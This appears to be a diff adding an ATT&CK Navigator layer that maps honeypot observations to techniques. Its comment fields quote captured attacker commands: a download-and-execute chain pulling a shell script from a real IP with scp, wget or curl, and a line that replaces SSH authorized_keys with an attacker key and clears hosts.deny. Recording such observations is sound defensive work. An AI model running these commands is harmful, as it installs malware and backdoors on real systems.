@@ -1,0 +1,87 @@
+{
+  "name": "Greyfield observed techniques",
+  "versions": {
+    "attack": "19.2",
+    "navigator": "5.1",
+    "layer": "4.5"
+  },
+  "domain": "enterprise-attack",
+  "description": "ATT&CK techniques mapped conservatively from Greyfield Cowrie observations; counts represent observed evidence, not attributed incidents.",
+  "techniques": [
+    {
+      "techniqueID": "T1059.004",
+      "score": 12191,
+      "comment": "sh; system",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1110.001",
+      "score": 8174,
+      "comment": "enable\\x00 / linuxshell\\x00; enable / linuxshell",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1083",
+      "score": 1227,
+      "comment": "ls /home; /bin/busybox BOTNET; /bin/busybox cat /proc/self/exe || cat /proc/self/exe",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1222.002",
+      "score": 880,
+      "comment": ">/boot/.f && chmod 777 /boot/.f && /boot/.f && cd /boot/;; >/data/.f && chmod 777 /data/.f && /data/.f && cd /data/;",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1082",
+      "score": 242,
+      "comment": "uname -a; df -h | head -n 2 | awk 'FNR == 2 {print $2;}'",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1105",
+      "score": 79,
+      "comment": "Malformed transfer reference withheld; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1070.004",
+      "score": 73,
+      "comment": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~; rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1057",
+      "score": 35,
+      "comment": "top; ps -ef | grep '[Mm]iner'",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1053.003",
+      "score": 31,
+      "comment": "crontab -l",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1098.004",
+      "score": 31,
+      "comment": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1016",
+      "score": 4,
+      "comment": "/ip cloud print; ifconfig",
+      "enabled": true
+    }
+  ],
+  "gradient": {
+    "colors": [
+      "#17131f",
+      "#7857ff",
+      "#ff5d73"
+    ],
+    "minValue": 0,
+    "maxValue": 12191
+  }
+}
